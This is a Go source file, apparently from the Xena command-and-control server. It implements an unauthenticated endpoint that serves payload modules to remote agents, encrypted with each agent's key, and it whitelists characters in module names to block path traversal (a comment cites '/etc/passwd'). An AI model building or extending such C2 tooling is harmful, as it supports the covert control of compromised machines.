package ctrl

import (
	"c2/core"
	agentsRepo "c2/repos/agents"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"
	xenaC2 "github.com/zarkones/xena-client"
	cry "github.com/zarkones/xena-crypto"
)

func DownloadModule(c *gin.Context) {
	var ctx xenaC2.AgentModuleReqCtx
	if err := c.BindJSON(&ctx); err != nil {
		fmt.Println("failed to unserialize agent module req ctx:", err)
		c.JSON(http.StatusBadRequest, nil)
		return
	}

	agent, err := agentsRepo.Get(ctx.AgentID)
	if err != nil {
		fmt.Println("agent '"+ctx.AgentID+"' ccould not be read from the database:", err)
		c.JSON(http.StatusNotFound, nil)
		return
	}

	agentPubKey, err := cry.ImportPubKeyPEM([]byte(agent.PubKeyPEM))
	if err != nil {
		fmt.Println("ctrl.MessagesSubscribe: cry.ImportPubKeyPEM():", err)
		c.Status(http.StatusInternalServerError)
		return
	}

	// As this is non-authenticated endpoint, it is crucial to normalize this path by WHITELISTING
	// characters, as blacklisting would always skip some obscure path separator or something,
	// and before you know it an exploit would be released to with PoC reading "/etc/passwd".
	normalizedModuleName := ""
	afterDot := false
	for _, ch := range strings.ToUpper(ctx.ModuleName) {
		ch := string(ch)
		if !strings.Contains("._1234567890POIUYTREWQASDFGHJKLMNBVCXZ", ch) {
			continue
		}
		if ch == "." {
			afterDot = true
		}
		if afterDot {
			normalizedModuleName += strings.ToLower(ch)
			continue
		}
		normalizedModuleName += ch
	}

	moduleBinary, err := os.ReadFile(filepath.Join(core.PATH_MODULES, normalizedModuleName))
	if err != nil {
		fmt.Println("failed to load module '"+normalizedModuleName+"' from the file system:", err)
		c.JSON(http.StatusInternalServerError, nil)
		return
	}

	encryptedModuleBin, err := cry.SecureWrap(agentPubKey, string(moduleBinary))
	if err != nil {
		fmt.Println("failed to encrypt the module '"+normalizedModuleName+"':", err)
		c.JSON(http.StatusInternalServerError, nil)
		return
	}

	c.Writer.Write([]byte(encryptedModuleBin))
}
